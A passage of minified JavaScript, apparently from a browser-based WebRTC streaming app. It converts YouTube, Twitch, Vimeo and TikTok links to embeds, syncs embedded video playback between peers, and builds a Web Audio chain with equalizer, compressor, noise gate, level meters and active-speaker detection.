fakeElement=document.createElement("video");fakeElement.autoplay=!0,fakeElement.loop=!0,fakeElement.muted=!0,fakeElement.src="./media/micro.mp4",fakeElement.style.width="1px",fakeElement.style.height="1px",fakeElement.controls=!1,fakeElement.id="keepAlivePlayer",getById("main").appendChild(fakeElement)}}),4e3),session.publishStream(getById("previewWebcam"))}}function createYoutubeLink(vidid){return"https://www.youtube.com/embed/"+vidid+"?modestbranding=1&playsinline=1&enablejsapi=1"}function parseURL4Iframe(iframeURL){if(""==iframeURL&&(iframeURL="./"),iframeURL===session.iframeSrc)return iframeURL;if(iframeURL.startsWith("http://"))try{iframeURL="https://"+iframeURL.split("http://")[1]}catch(e){errorlog(e)}if(iframeURL.startsWith("https://")||iframeURL.startsWith("http://")){var domain=new URL(iframeURL);if("youtu.be"==(domain=domain.hostname)&&(iframeURL=iframeURL.replace("youtu.be/","youtube.com/watch?v=")),"youtu.be"==domain||"www.youtube.com"==domain||"youtube.com"==domain){var regExp=/^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#&?]*).*/,vidid=!(!(match=iframeURL.match(regExp))||11!=match[7].length)&&match[7];if(iframeURL.includes("/live_chat")&&(iframeURL.includes("&embed_domain=")||(iframeURL+="&embed_domain="+location.hostname)),vidid)iframeURL=createYoutubeLink(vidid);else{regExp=/^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(videoseries\?))\??list?=?([^#&?]*).*/;var match,plid=!(!(match=(iframeURL=iframeURL.replace("playlist?list=","embed/videoseries?list=")).match(regExp))||34!=match[7].length)&&match[7];plid&&(iframeURL="https://www.youtube.com/embed/videoseries?list="+plid+"&autoplay=1&modestbranding=1&playsinline=1&enablejsapi=1")}}else if("twitch.tv"==domain||"www.twitch.tv"==domain){if(iframeURL.includes("twitch.tv/popout/"))iframeURL=(iframeURL=(iframeURL=(iframeURL=(iframeURL=(iframeURL=iframeURL.replace("/popout/","/embed/")).replace("?popout=","?parent="+location.hostname)).replace("?popout","?parent="+location.hostname)).replace("&popout=","?parent="+location.hostname)).replace("&popout","?parent="+location.hostname)).includes("darkpopout=")?iframeURL.replace("?darkpopout=","?darkpopout=&parent="+location.hostname):iframeURL.replace("?darkpopout","?darkpopout&parent="+location.hostname);else(vidid=iframeURL.split("/").pop().split("#")[0].split("?")[0])&&(iframeURL="https://player.twitch.tv/?channel="+vidid+"&parent="+location.hostname)}else if("www.vimeo.com"==domain||"vimeo.com"==domain)iframeURL=(iframeURL=iframeURL.replace("//vimeo.com/","//player.vimeo.com/video/")).replace("//www.vimeo.com/","//player.vimeo.com/video/");else if(domain.includes("tiktok.com")){var split=iframeURL.split("/video/");split.length>1&&(iframeURL="https://www.tiktok.com/embed/v2/"+(split=split[1].split("/")[0].split("?")[0].split("#")[0]))}}return iframeURL}function soloLinkGenerator(streamID,scene=!0){var codecGroupFlag="";session.codecGroupFlag&&(codecGroupFlag=session.codecGroupFlag),session.bitrateGroupFlag&&(codecGroupFlag+=session.bitrateGroupFlag);var wss="";session.wssSetViaUrl&&(wss=session.customWSS&&!0!==session.customWSS?"&pie="+session.customWSS:"&wss="+session.wss);var passAdd2="";return session.password&&!1===session.defaultPassword&&(passAdd2="&password="+session.password),session.token&&(passAdd2+="&token="+session.token),scene?"https://"+location.host+location.pathname+"?view="+streamID+"&solo"+codecGroupFlag+"&room="+session.roomid+passAdd2+wss+soloLinkAppended:"https://"+location.host+location.pathname+"?view="+streamID+codecGroupFlag+passAdd2+wss+soloLinkAppended}function YoutubeAPI(iframe,func,args){if(iframe&&iframe.contentWindow)try{iframe.contentWindow.postMessage(JSON.stringify({event:"command",func:func,args:args||[],id:iframe.id||"unknown"}),"*")}catch(e){}}function YoutubeListen(iframe_id){var iframe=document.getElementById(iframe_id);if(iframe&&!iframe.loadedYoutubeListen){try{iframe.contentWindow.postMessage(JSON.stringify({event:"listening",id:iframe_id}),"*")}catch(e){}setTimeout((function(iframe_id){YoutubeListen(iframe_id)}),1e3,iframe_id)}}function processYoutubeEvent(e){if(e.type&&"message"===e.type){try{if("id"in(data=JSON.parse(e.data))){var iframe=document.getElementById(data.id);if(!iframe)return;iframe.loadedYoutubeListen||(iframe.loadedYoutubeListen=!0)}if(!("mediaReferenceTime"in data.info))return}catch(e){return}if(log(e),"iframe_source"==iframe.id){session.iframeEle.sendOnNewConnect||(session.iframeEle.sendOnNewConnect={},session.iframeEle.sendOnNewConnect.ifs={},session.iframeEle.sendOnNewConnect.ifs.t=null,session.iframeEle.sendOnNewConnect.ifs.v=null,session.iframeEle.sendOnNewConnect.ifs.s=null,session.iframeEle.sendOnNewConnect.ifs.r=null);try{var msg={ifs:{}};try{msg.ifs.t=parseFloat(data.info.mediaReferenceTime+.01)||0,session.iframeEle.sendOnNewConnect.ifs.t=msg.ifs.t}catch(e){return}if("playerState"in data.info){if(msg.ifs.s=parseInt(data.info.playerState),-1==msg.ifs.s&&(msg.ifs.s=0),2==msg.ifs.s&&(3==session.iframeEle.sendOnNewConnect.ifs.s?delete msg.ifs.s:msg.ifs.s=3),msg.ifs.s&&session.iframeEle.sendOnNewConnect.ifs.s!=msg.ifs.s&&(session.iframeEle.sendOnNewConnect.ifs.s=msg.ifs.s),"videoData"in data.info)if(session.iframeEle.sendOnNewConnect.ifs.v!=data.info.videoData.video_id)if(session.iframeEle.sendOnNewConnect.ifs.v=data.info.videoData.video_id,msg.ifs.v=data.info.videoData.video_id,(vidSrc=createYoutubeLink(msg.ifs.v))!==session.iframeSrc){session.iframeSrc=vidSrc;var data={};for(var UUID in data.iframeSrc=session.iframeSrc,parseInt(msg.ifs.t)>1&&(data.iframeSrc+="&start="+parseInt(Math.ceil(msg.ifs.t))),session.pcs)!0===session.pcs[UUID].allowIframe&&session.sendMessage(data,UUID);return}}else if("videoData"in data.info){var vidSrc;if(session.iframeEle.sendOnNewConnect.ifs.v!=data.info.videoData.video_id)if(msg.ifs.v=data.info.videoData.video_id,session.iframeEle.sendOnNewConnect.ifs.v=msg.ifs.v,(vidSrc=createYoutubeLink(msg.ifs.v))!==session.iframeSrc){session.iframeSrc=vidSrc;data={};for(var UUID in data.iframeSrc=session.iframeSrc,parseInt(msg.ifs.t)>1&&(data.iframeSrc+="&start="+parseInt(Math.ceil(msg.ifs.t))),"1"==session.iframeEle.sendOnNewConnect.ifs.s?data.iframeSrc+="&autoplay=1":data.iframeSrc+="&autoplay=0",session.pcs)!0===session.pcs[UUID].allowIframe&&session.sendMessage(data,UUID);return}}else"playbackRate"in data.info&&(msg.ifs.r=parseFloat(data.info.playbackRate),session.iframeEle.sendOnNewConnect.ifs.r!=msg.ifs.r?session.iframeEle.sendOnNewConnect.ifs.r=msg.ifs.r:delete msg.ifs.r),1==session.iframeEle.sendOnNewConnect.ifs.s&&"t"in msg.ifs&&delete msg.ifs.t;if(0==Object.keys(msg.ifs).length)return;for(var UUID in session.pcs)session.pcs[UUID].allowIframe&&session.sendMessage(msg)}catch(e){return}}else try{UUID=iframe.dataset.UUID;"t"in(msg={ifs:{}}).ifs&&(msg.ifs.t=parseFloat(data.info.mediaReferenceTime+.01)||0),"playerState"in data.info&&(msg.ifs.s=parseInt(data.info.playerState)),"videoData"in data.info&&(msg.ifs.v=data.info.videoData.video_id),"playbackRate"in data.info&&1!==data.info.playbackRate&&(msg.ifs.r=parseFloat(data.info.playbackRate)),session.sendRequest(msg,UUID)}catch(e){return}}}function processIframeSyncFeedback(ifs,UUID){warnlog(ifs)}function processIframeSyncUpdates(ifs,UUID){ifs.v&&"s"in ifs||("s"in ifs?("t"in ifs&&YoutubeAPI(session.rpcs[UUID].iframeEle,"seekTo",[parseFloat(ifs.t)]),YoutubeAPI(session.rpcs[UUID].iframeEle,"playVideo")):"t"in ifs&&YoutubeAPI(session.rpcs[UUID].iframeEle,"seekTo",[parseFloat(ifs.t)])),ifs.r&&YoutubeAPI(session.rpcs[UUID].iframeEle,"setPlaybackRate",[parseFloat(ifs.r)]),"s"in ifs&&(-1==ifs.s||0==ifs.s?YoutubeAPI(session.rpcs[UUID].iframeEle,"stopVideo"):1==ifs.s?YoutubeAPI(session.rpcs[UUID].iframeEle,"playVideo"):2==ifs.s||3==ifs.s?YoutubeAPI(session.rpcs[UUID].iframeEle,"pauseVideo"):ifs.s)}function updatePushId(){session.doNotSeed||(urlParams.has("push")?updateURL("push="+session.streamID):urlParams.has("id")?updateURL("id="+session.streamID):urlParams.has("permaid")?updateURL("permaid="+session.streamID):updateURL("push="+session.streamID))}function disabledWebAudioPathway(){if(session.streamSrcClone&&(log("123a"),session.streamSrcClone.getTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop()}))),session.streamSrc&&session.streamSrc.clone){log("123b");var streamSrc=session.streamSrc.clone();return session.streamSrcClone=streamSrc,streamSrc}log("123c");var newStream=createMediaStream();return session.streamSrcClone=newStream,session.streamSrc&&session.streamSrc.getAudioTracks().forEach((function(track){newStream.addTrack(track,session.streamSrc)})),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){newStream.addTrack(track,session.videoElement.srcObject)})):session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){newStream.addTrack(track,session.streamSrc)})),newStream}function outboundAudioPipeline(){if(session.disableWebAudio)return disabledWebAudioPathway();if(!session.streamSrc)return errorlog("STREAM DOES NOT EXIST. This is a problem"),checkBasicStreamsExist(),session.streamSrc;var streamSrc=session.streamSrc;if(iOS||iPad){if(session.streamSrcClone){if((tracks=session.streamSrcClone.getAudioTracks()).length)for(var waid in session.webAudios)session.webAudios[waid].stop(),delete session.webAudios[waid];session.streamSrcClone.getTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop()}))}session.streamSrc&&session.streamSrc.clone?(streamSrc=session.streamSrc.clone(),session.streamSrcClone=streamSrc):(streamSrc=createMediaStream(),session.streamSrc&&session.streamSrc.getAudioTracks().forEach((function(track){streamSrc.addTrack(track,session.streamSrc)})),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){streamSrc.addTrack(track,session.videoElement.srcObject)})):session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){streamSrc.addTrack(track,session.streamSrc)})),session.streamSrcClone=streamSrc)}for(var waid in session.webAudios)session.webAudios[waid].stop(),delete session.webAudios[waid];try{var tracks;if(log("Web Audio"),(tracks=streamSrc.getAudioTracks()).length){var webAudio={micDelay:!1,compressor:!1,analyser:!1,gainNode:!1,splitter:!1,subGainNodes:!1,lowEQ:!1,midEQ:!1,highEQ:!1,lowcut1:!1,lowcut2:!1,lowcut3:!1};if(webAudio.id=tracks[0].id,session.audioCtxOutbound);else if(Firefox||SafariVersion||session.mobile)session.audioCtxOutbound=new AudioContext;else if(!1!==session.audioLatency)session.audioCtxOutbound=new AudioContext({latencyHint:session.audioLatency/1e3,sampleRate:48e3});else try{session.audioCtxOutbound=new AudioContext({sampleRate:48e3})}catch(e){session.audioCtxOutbound=new AudioContext,errorlog(e)}if(session.audioCtxOutbound&&session.audioCtxOutbound.sampleRate&&session.audioCtxOutbound.sampleRate>192e3&&console.error("Warning: Your audio playback device has a very high sample rate set; lower it to 48000-Hz to avoid audio issues"),webAudio.audioContext=session.audioCtxOutbound,webAudio.destination=session.audioCtxOutbound.createMediaStreamDestination(),tracks.length>1)try{webAudio.mediaStreamSource=createMediaStream();var maxChannelCount=2;!1===session.stereo&&(maxChannelCount=1),webAudio.subGainNodes={};for(var merger=session.audioCtxOutbound.createChannelMerger(maxChannelCount),i=0;i<tracks.length;i++)try{var tempStream=createMediaStream();if(tempStream.addTrack(tracks[i]),trackStream=session.audioCtxOutbound.createMediaStreamSource(tempStream),webAudio.subGainNodes[tracks[i].id]=session.audioCtxOutbound.createGain(),trackStream.connect(webAudio.subGainNodes[tracks[i].id]),2==maxChannelCount){var splitter=session.audioCtxOutbound.createChannelSplitter(2);webAudio.subGainNodes[tracks[i].id].connect(splitter),splitter.connect(merger,0,0);try{splitter.connect(merger,1,1)}catch(e){errorlog(e);try{splitter.connect(merger,0,1)}catch(e){errorlog(e)}}}else webAudio.subGainNodes[tracks[i].id].connect(merger,0,0)}catch(e){return errorlog(e),errorlog("Disabling web audio output node processing. Possibly an audio sample rate mismatch issue."),disabledWebAudioPathway()}webAudio.gainNode=audioGainNode(merger,session.audioCtxOutbound)}catch(e){errorlog(e);try{webAudio.mediaStreamSource=session.audioCtxOutbound.createMediaStreamSource(streamSrc),webAudio.gainNode=audioGainNode(webAudio.mediaStreamSource,session.audioCtxOutbound)}catch(e){return errorlog(e),errorlog("Disabling web audio output node processing. Possibly an audio sample rate mismatch issue."),disabledWebAudioPathway()}}else try{webAudio.mediaStreamSource=session.audioCtxOutbound.createMediaStreamSource(streamSrc),webAudio.gainNode=audioGainNode(webAudio.mediaStreamSource,session.audioCtxOutbound)}catch(e){return errorlog(e),errorlog("Disabling web audio output node processing. Possibly an audio sample rate mismatch issue."),disabledWebAudioPathway()}var anonNode=webAudio.gainNode;if(1==session.audioInputChannels&&(webAudio.splitter=session.audioCtxOutbound.createChannelSplitter(6),anonNode.connect(webAudio.splitter),webAudio.merger=session.audioCtxOutbound.createChannelMerger(1),webAudio.splitter.connect(webAudio.merger,0,0),webAudio.splitter.connect(webAudio.merger,1,0),webAudio.splitter.connect(webAudio.merger,2,0),webAudio.splitter.connect(webAudio.merger,3,0),webAudio.splitter.connect(webAudio.merger,4,0),webAudio.splitter.connect(webAudio.merger,5,0),anonNode=webAudio.merger),session.lowcut&&(webAudio.lowcut1=session.audioCtxOutbound.createBiquadFilter(),webAudio.lowcut1.type="highpass",webAudio.lowcut1.frequency.value=session.lowcut,webAudio.lowcut2=session.audioCtxOutbound.createBiquadFilter(),webAudio.lowcut2.type="highpass",webAudio.lowcut2.frequency.value=session.lowcut,webAudio.lowcut3=session.audioCtxOutbound.createBiquadFilter(),webAudio.lowcut3.type="highpass",webAudio.lowcut3.frequency.value=session.lowcut,anonNode.connect(webAudio.lowcut1),webAudio.lowcut1.connect(webAudio.lowcut2),webAudio.lowcut2.connect(webAudio.lowcut3),anonNode=webAudio.lowcut3),session.voicechanger){let waveShaper=session.audioCtxOutbound.createWaveShaper();waveShaper.curve=function makeDistortionCurve(amount=10){var x,sampleRate=session.audioCtxOutbound.sampleRate||48e3,curve=new Float32Array(sampleRate);for(let i=0;i<sampleRate;++i)x=2*i/sampleRate-1,curve[i]=(3+amount)*x*20*(Math.PI/180)/(Math.PI+amount*Math.abs(x));return curve}(5);var realCoeffs=new Float32Array([1,0]),imagCoeffs=new Float32Array([0,1]);realCoeffs=new Float32Array(20),imagCoeffs=new Float32Array(20);realCoeffs[0]=.5;for(i=1;i<20;i++)imagCoeffs[i]=1/(i*Math.PI)*(1-Math.random()/2);let oscillator=session.audioCtxOutbound.createOscillator();oscillator.frequency.value=10;const wave=session.audioCtxOutbound.createPeriodicWave(realCoeffs,imagCoeffs);oscillator.setPeriodicWave(wave);let oscillatorGain=session.audioCtxOutbound.createGain();oscillatorGain.gain.value=.005,oscillator.connect(oscillatorGain),oscillator.start(0);let delay=session.audioCtxOutbound.createDelay();delay.delayTime.value=.01,oscillatorGain.connect(delay.delayTime);let lowEQ=session.audioCtxOutbound.createBiquadFilter();lowEQ.type="peaking",lowEQ.frequency.value=200,lowEQ.Q.value=.5,lowEQ.gain.value=6;let mid=session.audioCtxOutbound.createBiquadFilter();mid.type="peaking",mid.frequency.value=500,mid.Q.value=.5,mid.gain.value=-10,anonNode.connect(delay),delay.connect(waveShaper),waveShaper.connect(mid),mid.connect(lowEQ),anonNode=lowEQ}session.equalizer&&(webAudio.lowEQ=session.audioCtxOutbound.createBiquadFilter(),webAudio.lowEQ.type="lowshelf",webAudio.lowEQ.frequency.value=100,webAudio.lowEQ.gain.value=0,webAudio.midEQ=session.audioCtxOutbound.createBiquadFilter(),webAudio.midEQ.type="peaking",webAudio.midEQ.frequency.value=1e3,webAudio.midEQ.Q.value=.5,webAudio.midEQ.gain.value=0,webAudio.highEQ=session.audioCtxOutbound.createBiquadFilter(),webAudio.highEQ.type="highshelf",webAudio.highEQ.frequency.value=1e4,webAudio.highEQ.gain.value=0,anonNode.connect(webAudio.lowEQ),webAudio.lowEQ.connect(webAudio.midEQ),webAudio.midEQ.connect(webAudio.highEQ),anonNode=webAudio.highEQ),1===session.compressor?(webAudio.compressor=audioCompressor(anonNode,session.audioCtxOutbound),anonNode=webAudio.compressor):2===session.compressor&&(webAudio.compressor=audioLimiter(anonNode,session.audioCtxOutbound),anonNode=webAudio.compressor),!1!==session.micDelay&&(webAudio.micDelay=micDelayNode(anonNode,session.audioCtxOutbound),anonNode=webAudio.micDelay),!1!==session.noisegate?(webAudio.analyser=audioMeter(anonNode,session.audioCtxOutbound),anonNode=webAudio.analyser,webAudio.gatingNode=audioGatingNode(anonNode,session.audioCtxOutbound),webAudio.gatingNode.connect(webAudio.destination)):(webAudio.analyser=audioMeter(anonNode,session.audioCtxOutbound),webAudio.analyser.connect(webAudio.destination)),webAudio.stop=function(){webAudio.stop=function(){errorlog("Trying to stop webaudio more than once")};try{clearInterval(webAudio.analyser.interval)}catch(e){errorlog(e)}for(var node in webAudio)if(webAudio[node]&&"stop"!=node&&"id"!=node&&"audioContext"!=node&&"mediaStreamSource"!=node)if("subGainNodes"!=node)try{webAudio[node].disconnect(),webAudio[node]=null,log("disconnected node: "+node)}catch(e){warnlog("node: "+node),warnlog(webAudio[node]),errorlog(e)}else{for(var nn in webAudio[node])if(webAudio[node][nn])try{webAudio[node][nn].disconnect(),webAudio[node][nn]=null,log("disconnected node: "+node)}catch(e){warnlog("node: "+node),warnlog("nn: "+nn),errorlog(e)}webAudio[node]=null}webAudio=null},webAudio.mediaStreamSource.onended=function(){webAudio.stop()},session.webAudios[webAudio.id]=webAudio,session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){webAudio.destination.stream.addTrack(track,session.videoElement.srcObject)})):streamSrc&&streamSrc.getVideoTracks().forEach((function(track){webAudio.destination.stream.addTrack(track,streamSrc)}));try{"suspended"==session.audioCtxOutbound.state&&session.audioCtxOutbound.resume()}catch(e){warnlog("session.audioCtx.resume(); failed")}return webAudio.destination.stream}if(session.videoElement&&session.videoElement.srcObject)return session.videoElement.srcObject;var newStream=createMediaStream();return streamSrc&&streamSrc.getVideoTracks().forEach((function(track){newStream.addTrack(track,streamSrc)})),newStream}catch(e){return errorlog(e),streamSrc}}function changeLowCut(freq,deviceid=null){for(var webAudio in log("LOW EQ"),session.webAudios){if(!session.webAudios[webAudio].lowcut1)return void errorlog("EQ not setup");if(!session.webAudios[webAudio].lowcut2)return void errorlog("EQ not setup");if(!session.webAudios[webAudio].lowcut3)return void errorlog("EQ not setup");session.webAudios[webAudio].lowcut1.frequency.setValueAtTime(freq,session.webAudios[webAudio].audioContext.currentTime),session.webAudios[webAudio].lowcut2.frequency.setValueAtTime(freq,session.webAudios[webAudio].audioContext.currentTime),session.webAudios[webAudio].lowcut3.frequency.setValueAtTime(freq,session.webAudios[webAudio].audioContext.currentTime)}}function changeLowEQ(lowEQ,deviceid=null){for(var webAudio in log("LOW EQ"),session.webAudios){if(!session.webAudios[webAudio].lowEQ)return void errorlog("EQ not setup");session.webAudios[webAudio].lowEQ.gain.setValueAtTime(lowEQ,session.webAudios[webAudio].audioContext.currentTime)}}function changeMidEQ(midEQ,deviceid=null){for(var webAudio in session.webAudios){if(!session.webAudios[webAudio].midEQ)return void errorlog("EQ not setup");session.webAudios[webAudio].midEQ.gain.setValueAtTime(midEQ,session.webAudios[webAudio].audioContext.currentTime)}}function changeHighEQ(highEQ,deviceid=null){for(var webAudio in session.webAudios){if(!session.webAudios[webAudio].highEQ)return void errorlog("EQ not setup");session.webAudios[webAudio].highEQ.gain.setValueAtTime(highEQ,session.webAudios[webAudio].audioContext.currentTime)}}function changeMicDelay(delay,deviceid=null){for(var waid in log("changeMicDelay :"+delay),session.webAudios)session.webAudios[waid].micDelay?session.webAudios[waid].micDelay.delayTime.setValueAtTime(delay/1e3,session.webAudios[waid].audioContext.currentTime):errorlog("Mic Delay not setup")}function changeSubGain(gain,deviceid=null){for(var webAudio in gain=!1!==gain?parseFloat(gain/100)||0:1,session.webAudios)try{if(!session.webAudios[webAudio].subGainNodes)return void errorlog("EQ not setup");deviceid in session.webAudios[webAudio].subGainNodes?session.webAudios[webAudio].subGainNodes[deviceid].gain.setValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime):errorlog("NOT FOUND:"+deviceid);break}catch(e){errorlog(e)}}function changeMainGain(gain,fadeout=0){for(var webAudio in session.webAudios){if(!session.webAudios[webAudio].gainNode)return;if(gain=!1!==gain?parseFloat(gain/100)||0:1,fadeout)try{session.webAudios[webAudio].gainNode.gain.linearRampToValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime+fadeout/1e3)}catch(e){session.webAudios[webAudio].gainNode.gain.setValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime)}else session.webAudios[webAudio].gainNode.gain.setValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime)}}function changeGatingGain(gain,fadeout=0){for(var webAudio in session.webAudios){if(!session.webAudios[webAudio].gatingNode)return;if(gain=!1!==gain?parseFloat(gain/100)||0:1,fadeout)try{session.webAudios[webAudio].gatingNode.gain.linearRampToValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime+fadeout/1e3)}catch(e){session.webAudios[webAudio].gatingNode.gain.setValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime)}else session.webAudios[webAudio].gatingNode.gain.setValueAtTime(gain,session.webAudios[webAudio].audioContext.currentTime)}}function micDelayNode(mediaStreamSource,audioContext){if(!1!==session.micDelay)var delay=parseFloat(session.micDelay/1e3)||0,delayNode=audioContext.createDelay(delay+.5);else delay=0,delayNode=audioContext.createDelay(.5);return delayNode.delayTime.value=delay,mediaStreamSource.connect(delayNode),delayNode}function audioGainNode(mediaStreamSource,audioContext){var gainNode=audioContext.createGain();if(!1!==session.audioGain)var gain=parseFloat(session.audioGain/100)||0;else gain=1;return gainNode.gain.value=gain,mediaStreamSource.connect(gainNode),gainNode}function audioGatingNode(mediaStreamSource,audioContext){var gateNode=audioContext.createGain();return gateNode.gain.value=1,mediaStreamSource.connect(gateNode),gateNode}function audioMeter(mediaStreamSource,audioContext){var analyser=audioContext.createAnalyser();mediaStreamSource.connect(analyser),analyser.fftSize=256,analyser.smoothingTimeConstant=.05;var bufferLength=analyser.frequencyBinCount,dataArray=new Uint8Array(bufferLength),timer=null,meter1=document.getElementById("meter1")||!1,meter2=document.getElementById("meter2")||!1,meter3=document.getElementById("meter3")||!1,meter4=document.getElementById("meter4")||!1,currentlyActive=0,ng1=10,ng2=25,ng3=30;return session.noisegateSettings&&(session.noisegateSettings.length&&(ng1=parseInt(session.noisegateSettings[0])||0),session.noisegateSettings.length>1&&(ng2=parseInt(session.noisegateSettings[1])||ng2),session.noisegateSettings.length>2&&(ng3=parseInt(session.noisegateSettings[2])||0,ng3/=100)),session.noisegate&&changeGatingGain(ng1,200),analyser.interval=setInterval((function(){!function draw(){try{analyser.getByteFrequencyData(dataArray);for(var total=0,i=0;i<dataArray.length;i++)total+=dataArray[i];if(total/=100,session.quietOthers&&2==session.quietOthers&&(total>10?0==session.muted_activeSpeaker&&(session.muted_activeSpeaker=!0,session.speakerMuted=!0,clearTimeout(timer),toggleSpeakerMute(!0)):1==session.muted_activeSpeaker&&(session.speakerMuted=!1,session.muted_activeSpeaker=!1,session.activelySpeaking=!1,clearTimeout(timer),timer=setTimeout((function(){toggleSpeakerMute(!0)}),250))),1==session.pushLoudness){var loudnessObj={};loudnessObj[session.streamID]=parseInt(total),isIFrame&&parent.postMessage({loudness:loudnessObj,action:"loudness",value:total},session.iframetarget)}if(session.noisegate&&(total<=ng2?currentlyActive==ng3?(changeGatingGain(ng1,200),log("GAIN LOWERED"),currentlyActive=ng3+1):currentlyActive<ng3&&(currentlyActive+=1):currentlyActive==ng3+1?(changeGatingGain(100,200),currentlyActive=0,log("GAIN INCREASED")):currentlyActive=0),meter1)return document.getElementById("meter1")?0==total||total<=1?(meter1.style.width="1px",meter2.style.width="0px"):total<=150?(meter1.style.width=total+"px",meter2.style.width="0px"):total>150&&(total>200&&(total=200),meter1.style.width="150px",meter2.style.width=total-150+"px"):meter1=!1,void(!1!==session.audioGain&&(document.getElementById("previewWebcam")?changeMainGain(100):changeMainGain(session.audioGain)));if(toggleSettingsState&&document.getElementById("meter3"))return 0==total||total<=1?(meter3.style.width="1px",meter4.style.width="0px"):total<=150?(meter3.style.width=total+"px",meter4.style.width="0px"):total>150&&(total>200?(meter3.style.width="150px",meter4.style.width="50px"):(meter3.style.width="150px",meter4.style.width=total-150+"px")),document.getElementById("mutetoggle")&&((total*=3)>255&&(total=255),total=parseInt(total),document.getElementById("mutetoggle").style.color="rgb("+(255-total)+",255,"+(255-total)+")"),void(meter1=!1);if(session.cleanOutput)return void(meter1=!1);document.getElementById("mutetoggle")?((total*=3)>255&&(total=255),total=parseInt(total),document.getElementById("mutetoggle").style.color="rgb("+(255-total)+",255,"+(255-total)+")"):(clearInterval(analyser.interval),warnlog("METERS  NOT FOUND")),meter1=!1}catch(e){errorlog(e)}}()}),100),analyser}function audioCompressor(mediaStreamSource,audioContext){var compressor=audioContext.createDynamicsCompressor();return compressor.threshold.value=-40,compressor.knee.value=10,compressor.ratio.value=4,compressor.attack.value=.002,compressor.release.value=.1,mediaStreamSource.connect(compressor),compressor}function audioLimiter(mediaStreamSource,audioContext){var compressor=audioContext.createDynamicsCompressor();return compressor.threshold.value=-5,compressor.knee.value=0,compressor.ratio.value=20,compressor.attack.value=.001,compressor.release.value=.1,mediaStreamSource.connect(compressor),compressor}function activeSpeaker(border=!1){var lastActiveSpeaker=null,someoneElseIfSpeaking=!1,anyoneIsSpeaking=!1,defaultSpeaker=!1;for(var UUID in session.rpcs)!(session.activeSpeaker>2)||session.rpcs[UUID].videoElement&&session.rpcs[UUID].videoElement.srcObject&&session.rpcs[UUID].videoElement.srcObject.getVideoTracks().length&&!session.rpcs[UUID].videoMuted?(session.rpcs[UUID].stats._Audio_Loudness_average?session.rpcs[UUID].stats.Audio_Loudness&&session.rpcs[UUID].stats.Audio_Loudness>10?session.rpcs[UUID].stats._Audio_Loudness_average=parseFloat(.07*session.rpcs[UUID].stats.Audio_Loudness+.93*session.rpcs[UUID].stats._Audio_Loudness_average):session.rpcs[UUID].stats._Audio_Loudness_average=parseFloat(.975*session.rpcs[UUID].stats._Audio_Loudness_average):session.rpcs[UUID].stats._Audio_Loudness_average=1,session.rpcs[UUID].stats._Audio_Loudness_average>13?border?session.rpcs[UUID].videoElement&&(session.rpcs[UUID].videoElement.style.border="green solid 1px",session.rpcs[UUID].videoElement.style.padding="0"):session.rpcs[UUID].activelySpeaking||(session.rpcs[UUID].activelySpeaking=!0,lastActiveSpeaker=UUID,session.rpcs[UUID].stats._Audio_Loudness_average+=50):session.rpcs[UUID].stats._Audio_Loudness_average>6||(border?session.rpcs[UUID].videoElement&&(session.rpcs[UUID].videoElement.style.border="",session.rpcs[UUID].videoElement.style.padding="1px"):session.rpcs[UUID].activelySpeaking&&(session.rpcs[UUID].activelySpeaking=!1,lastActiveSpeaker=UUID)),(session.rpcs[UUID].stats.Audio_Loudness>13||session.rpcs[UUID].stats.Audio_Loudness>5&&session.rpcs[UUID].stats._Audio_Loudness_average>3||session.rpcs[UUID].stats._Audio_Loudness_average>6)&&(someoneElseIfSpeaking=!0),session.rpcs[UUID].activelySpeaking&&(anyoneIsSpeaking=!0),session.rpcs[UUID].defaultSpeaker&&(defaultSpeaker=!0)):(session.rpcs[UUID].activelySpeaking=!1,session.rpcs[UUID].defaultSpeaker=!1);var loudestActive=null,changed=!1;if(1===session.activeSpeaker||3===session.activeSpeaker)if(anyoneIsSpeaking){for(var UUID in session.rpcs)"_Audio_Loudness_average"in session.rpcs[UUID].stats&&(session.rpcs[UUID].activelySpeaking?loudestActive?session.rpcs[UUID].stats._Audio_Loudness_average>session.rpcs[loudestActive].stats._Audio_Loudness_average?(session.rpcs[loudestActive].defaultSpeaker&&(session.rpcs[loudestActive].defaultSpeaker=!1,changed=!0),loudestActive=UUID):session.rpcs[UUID].defaultSpeaker&&(session.rpcs[UUID].defaultSpeaker=!1,changed=!0):loudestActive=UUID:session.rpcs[UUID].defaultSpeaker&&(session.rpcs[UUID].defaultSpeaker=!1,changed=!0));loudestActive&&!session.rpcs[loudestActive].defaultSpeaker&&(session.rpcs[loudestActive].defaultSpeaker=!0,changed=!0)}else if(defaultSpeaker);else if(lastActiveSpeaker)session.rpcs[lastActiveSpeaker].defaultSpeaker=!0,changed=!0;else if(!1===session.scene||!1===session.nopreview&&1!==session.minipreview);else{for(var UUID in session.rpcs)if(session.rpcs[UUID].videoElement&&session.rpcs[UUID].videoElement.srcObject&&session.rpcs[UUID].videoElement.srcObject.getVideoTracks().length&&!session.rpcs[UUID].videoMuted){session.rpcs[UUID].defaultSpeaker=!0,changed=!0;break}if(!changed&&session.activeSpeaker<=2)for(var UUID in session.rpcs){if(session.rpcs[UUID].label){session.rpcs[UUID].defaultSpeaker=!0,changed=!0;break}changed||(session.rpcs[UUID].defaultSpeaker=!0,changed=!0)}}else if(2===session.activeSpeaker||4===session.activeSpeaker)if(anyoneIsSpeaking)for(var UUID in session.rpcs)session.rpcs[UUID].activelySpeaking&&!session.rpcs[UUID].defaultSpeaker?(session.rpcs[UUID].defaultSpeaker=!0,changed=!0):!session.rpcs[UUID].activelySpeaking&&session.rpcs[UUID].defaultSpeaker&&(session.rpcs[UUID].defaultSpeaker=!1,changed=!0);else 